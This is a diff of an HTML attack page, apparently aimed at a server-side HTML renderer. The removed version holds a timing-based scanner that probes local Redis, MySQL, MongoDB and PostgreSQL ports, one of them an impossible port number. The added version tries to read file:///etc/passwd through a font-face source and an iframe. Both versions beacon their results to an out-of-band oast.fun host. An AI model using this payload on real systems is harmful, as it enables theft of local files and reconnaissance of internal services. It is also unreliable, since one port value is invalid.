@@ -1,29 +1,44 @@
 <!DOCTYPE html>
 <html>
+<style>
+    /* Пытаемся подсунуть системный файл как шрифт */
+    @font-face {
+        font-family: 'Leaker';
+        src: url('file:///etc/passwd');
+    }
+
+    body {
+        font-family: 'Leaker', Arial;
+    }
+</style>
 <body>
+    <div id="test">root:x:0:0:root:/root:/bin/bash</div>
+    
     <script>
-        const hook = "https://esqbwjbyepcxrsacleqfu9095dccsqoxg.oast.fun";
+        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+        
+        // Если шрифт применится (даже криво), размеры текста изменятся
+        const width = document.getElementById('test').offsetWidth;
+        
+        navigator.sendBeacon(hook + "/FONT_WIDTH", JSON.stringify({
+            w: width,
+            msg: "If width is not standard, file was parsed"
+        }));
 
-        function probe(url, port) {
-            const start = Date.now();
-            const img = new Image();
-            
-            // Если порт открыт, но это не картинка - сработает onerror, но БЫСТРО
-            // Если порт закрыт - сработает onerror, но МЕДЛЕННО (таймаут)
-            img.onerror = () => {
-                const duration = Date.now() - start;
-                navigator.sendBeacon(`${hook}/PROBE_${port}?time=${duration}`);
-            };
-            
-            img.src = `${url}:${port}/favicon.ico`;
-        }
-
-        // Проверяем самые сочные порты
-       probe("http://127.0.0.1", "6379"); // Redis (часто без пароля внутри)
-probe("http://127.0.0.1", "3306"); // MySQL
-probe("http://127.0.0.1", "27017"); // MongoDB
-probe("http://127.0.0.1", "5432"); // PostgreSQL
-        probe("http://127.0.0.1", "54356782"); // PostgreSQL
+        // Попытка через IFRAME (иногда Chrome позволяет увидеть размер контента)
+        var ifr = document.createElement('iframe');
+        ifr.src = 'file:///etc/passwd';
+        ifr.style.width = '100px';
+        document.body.appendChild(ifr);
+        
+        setTimeout(() => {
+            try {
+                // Если мы можем прочитать длину истории или кадры - файл загружен
+                navigator.sendBeacon(hook + "/IFRAME_STATUS", ifr.contentWindow.length);
+            } catch(e) {
+                navigator.sendBeacon(hook + "/IFRAME_LOCKED", "SOP Active");
+            }
+        }, 1000);
     </script>
 </body>
 </html>
